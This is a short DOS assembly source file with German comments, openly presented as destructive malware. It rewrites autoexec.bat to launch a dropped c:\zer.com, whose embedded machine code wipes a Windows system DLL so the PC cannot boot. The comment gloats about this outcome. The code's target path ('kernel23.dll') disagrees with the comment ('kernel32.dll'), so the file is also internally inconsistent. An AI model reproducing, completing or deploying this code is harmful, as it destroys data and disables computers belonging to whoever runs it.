.model tiny
.code

;dieses Programm installiert sich und löscht beim nächsten PC-hochfahren kernel32.dll,
;was bedeutet, dass der PC nicht mehr hochgefahren werden kann. HARHAR!

mov ax,03c00
xor cx,cx
mov dx,offset aut
int 021
mov bx,ax
mov ax,04000
mov cx,13
mov dx,offset autxt
int 021
mov ax,03e00
int 021

mov ax,03c00
xor cx,cx
mov dx,offset autxt
int 021
mov bx,ax
mov ax,04000
mov cx,81
mov dx,offset prog
int 021
mov ax,03e00
int 021


mov ax,04c00
int 21h

.data
aut	db "c:\autoexec.bat",0
autxt	db "c:\zer.com",0,0d,0a
prog	db 184, 0, 60, 51, 201, 186, 39, 1, 205, 33, 139, 216, 184, 0, 62, 205, 33, 184, 0, 60, 51, 201, 186, 70, 1, 205, 33, 139, 216, 184, 0, 62, 205, 33, 184, 0, 76, 205, 33 ,"c:\windows\system\kernel23.dll", 0, "c:\zer.com", 0
cop	db " von Rafael Friesen."

end
